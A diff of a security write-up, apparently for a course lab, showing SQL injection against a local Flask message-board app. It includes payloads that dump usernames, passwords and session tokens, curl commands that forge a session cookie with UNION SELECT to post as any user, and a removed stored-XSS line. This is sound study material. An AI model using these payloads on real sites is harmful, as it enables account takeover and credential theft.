@@ -296,10 +296,10 @@ def posts():
 
 In the SQL query `INSERT INTO posts (message, user) VALUES ('...`, it is possible to dump the session tokens or even the username and password!
 
-This can be done by crafting the `message` that will interpret it as SQL query.
+This can be done by crafting the `message`
 
 ```sql
-1', 1), ((SELECT GROUP_CONCAT(username || ':' || password, '<br>') FROM users), 1)--
+1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--
 ```
 
 And once executed, this should return the home page with its posts.
@@ -307,7 +307,7 @@ And once executed, this should return the home page with its posts.
 ```HTML
 ...
 <li>1</li>
-<li>alice:12345678</li>
+<li>1,alice:12345678</li>
 ...
 ```
 
@@ -337,7 +337,7 @@ To explain how this works, the original SQL query takes a valid input message an
 INSERT INTO posts (message, user) VALUES ('<script>alert(document.domain)</script>', 1);
 ```
 
-However, since we have replaced the `message` with SQL injection, the query would now look like this
+However, since we have replaced the `message` with injected SQL query, it would now look like this
 
 ```sql
 INSERT INTO posts (message, user) VALUES ('1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1); -- ', 1);
@@ -347,12 +347,158 @@ This will first insert the message `1` into **user 1** and then insert the SQL q
 
 Similarly, this works for dumping the username and password.
 
+The scary thing about this vulnerability is that we can post a message on another user!
+This can be done by simply changing the user ID to another user (doesn't matter if it does not exist).
+
+```sql
+1', 69), ("I know you read 228922", 69) --
+```
+
+This will get inserted to the database on user 69.
+
+### Credential Bypass via SQL Injection on Session Token (aCVE-2024-3)
+
+Okay, bypassing the login page and then able to post a message on another user requires a bit more of an effort.
+*Why not just bypass the session token instead?*
+
+The web server is vulnerable to SQL injection, all of the SQL parameters are vulnerable to it.
+Thus with this context, let us try ***posting as another user without logging in!***
+
+Session tokens are important for user authentication.
+Usually, they are stored as a **cookie** to the web browser and it gets passed to an HTTP request method.
+
+Forging the session token might need a different tool or simply modify the cookie itself in the web browser.
+
+The web server uses `session_token` which is evident in the source code `request.cookies.get("session_token")`.
+
+Modifying the session token in the web browser is tad a bit annoying.
+I like to do it with `curl` instead (or use Burpsuite if you want to).
+
+A legitimate GET request with the session token looks like this using curl
+
+```bash
+curl -L 'http://0.0.0.0:5000/' -H "Cookie: session_token=e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65"
+```
+
+Assuming that the session token exists, this would return the home page of the user.
+
+> [!NOTE]
+> This actually exists in the database provided by the machine problem.
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Home</title>
+  </head>
+  <body>
+    <h2>Welcome, alice!</h2>
+    <a href="/logout">Logout</a>
+    <h3>Posts</h3>
+    <form method="post" action="/posts">
+      <input type="text" name="message">
+      <input type="submit" value="Post!">
+    </form>
+  </body>
+</html>
+```
+
+We can now make a POST request with similar method
+
+```bash
+curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65" --data-raw 'message=Breasts or Thighs? Which contains more meat? For a value meal.'
+```
+
+And running the GET request curl command once again will output
+
+```html
+...
+<ul>
+  <li>Breasts or Thighs? Which contains more meat? For a value meal.</li>
+</ul>
+...
+```
+
+That's basically it.
+Next is attacking the session token cookie.
+
+On the assumption that a user ID exists, forging a session token is performed this way
+
+```bash
+curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, 'random_name' as username FROM users LIMIT 1 --" 
+```
+
+And we're in.
+
+This vulnerability is dubbed as **Credential Bypass via SQL Injection on Session Token (aCVE-2024-3)**.
+
+As to how this works, a legitimate SQL query appears as
+
+```sql
+SELECT users.id, username
+FROM users
+INNER JOIN sessions
+ON users.id = sessions.user
+WHERE sessions.token = 'e96713ffbc66b273d48f5bbbf56e297686d55a3c488c55c94d233a32cac8be65';
+```
+
+which is found in
+
+```python
+res = cur.execute("SELECT users.id, username FROM users INNER JOIN sessions ON "
+    + "users.id = sessions.user WHERE sessions.token = '"
+    + request.cookies.get("session_token") + "';")
+user = res.fetchone()
+```
+
+This would return a list of users with that session token, and the first index is taken as the user.
+
+The result of the SQL query is
+
+```
+(1,alice)
+```
+
+However, this following code only checks and uses the user ID
+
+```python
+if user:
+  cur.execute("INSERT INTO posts (message, user) VALUES ('"
+    + request.form["message"] + "', " + str(user[0]) + ");")
+```
+
+ignoring the name of the user.
+
+This allows us to forge a session token with random names for any given user (even those that doesn't exists).
+
+**Since this vulnerability exists throughout the source code, it also serves as a means to post as another user without knowing their password!**
+The attack is crafted this way
+
+```bash
+curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT 1 as id, 'doyou' as username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
+```
+
+And checking the posts
+
+```bash
+curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, '' as username FROM users LIMIT 1 --" 
+```
+
+the output is
+
+```html
+...
+<li>Breasts or Thighs? Which contains more meat? For a value meal.</li>
+<li>alice watches 228922</li>
+...
+```
+
+***This is a serious concern...***
 
 ---
 
 This will also create a new `session_token` every time.
 
-curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT '69420' as id, 'eli' as username FROM users LIMIT 1--" --data-raw 'message=<script>alert(window.origin); alert(177013)</script>'
 
 curl 'http://0.0.0.0:5000/home'  -H 'Cookie: session_token=f5c8541ad5f844d551a4fc9f2554b821b437232324d32260e6d260c4603dbf8a' 
 
